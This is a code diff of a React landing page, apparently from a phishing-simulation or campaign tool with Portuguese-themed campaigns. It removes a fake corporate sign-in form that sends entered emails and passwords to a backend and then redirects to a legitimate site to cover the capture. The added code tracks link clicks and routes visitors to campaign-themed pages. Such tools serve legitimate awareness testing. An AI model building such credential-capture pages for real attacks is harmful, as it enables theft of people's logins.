@@ -1,95 +1,46 @@
 import React, { useState, useEffect } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
+import InvestimentoLanding from './themes/InvestimentoLanding';
+import RHLanding from './themes/RHLanding';
+import TILanding from './themes/TILanding';
+import DefaultLanding from './themes/DefaultLanding';
 import './styles.css';
 
 const LandingPage = () => {
-    const { linkId } = useParams();
-    const navigate = useNavigate();
-    const [formData, setFormData] = useState({
-        email: '',
-        password: ''
-    });
+  const { linkId } = useParams();
+  const navigate = useNavigate();
+  const [campaign, setCampaign] = useState(null);
 
-    useEffect(() => {
-        const recordClick = async () => {
-            try {
-                const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/landing/l/${linkId}`);
-                if (!response.ok) {
-                    navigate('/error');
-                }
-            } catch (error) {
-                console.error('Error recording click:', error);
-                navigate('/error');
-            }
-        };
-
-        if (linkId) {
-            recordClick();
+  useEffect(() => {
+    const recordClick = async () => {
+      try {
+        const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/landing/l/${linkId}`);
+        if (response.ok) {
+          const data = await response.json();
+          setCampaign(data.campaign.toLowerCase());
+        } else {
+          navigate('/error');
         }
-    }, [linkId, navigate]);
-
-    const handleSubmit = async (e) => {
-        e.preventDefault();
-        try {
-            const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/landing/submit/${linkId}`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(formData),
-            });
-
-            if (response.ok) {
-                // Redirect to a legitimate site or success page
-                window.location.href = 'https://legitimate-site.com';
-            }
-        } catch (error) {
-            console.error('Error submitting form:', error);
-        }
+      } catch (error) {
+        console.error('Error recording click:', error);
+        navigate('/error');
+      }
     };
 
-    const handleChange = (e) => {
-        setFormData({
-            ...formData,
-            [e.target.name]: e.target.value
-        });
-    };
+    if (linkId) recordClick();
+  }, [linkId, navigate]);
 
-    return (
-        <div className="landing-container">
-            <div className="login-box">
-                <div className="logo">
-                    <img src="/logo.png" alt="Company Logo" />
-                </div>
-                <h2>Sign in to continue</h2>
-                <form onSubmit={handleSubmit}>
-                    <div className="form-group">
-                        <label htmlFor="email">Email</label>
-                        <input
-                            type="email"
-                            id="email"
-                            name="email"
-                            value={formData.email}
-                            onChange={handleChange}
-                            required
-                        />
-                    </div>
-                    <div className="form-group">
-                        <label htmlFor="password">Password</label>
-                        <input
-                            type="password"
-                            id="password"
-                            name="password"
-                            value={formData.password}
-                            onChange={handleChange}
-                            required
-                        />
-                    </div>
-                    <button type="submit">Sign In</button>
-                </form>
-            </div>
-        </div>
-    );
+  if (!campaign) return <div>Loading...</div>;
+
+  if (campaign.includes("investimento")) {
+    return <InvestimentoLanding linkId={linkId} />;
+  } else if (campaign.includes("rh")) {
+    return <RHLanding linkId={linkId} />;
+  } else if (campaign.includes("ti") || campaign.includes("gti")) {
+    return <TILanding linkId={linkId} />;
+  } else {
+    return <DefaultLanding linkId={linkId} />;
+  }
 };
 
 export default LandingPage;
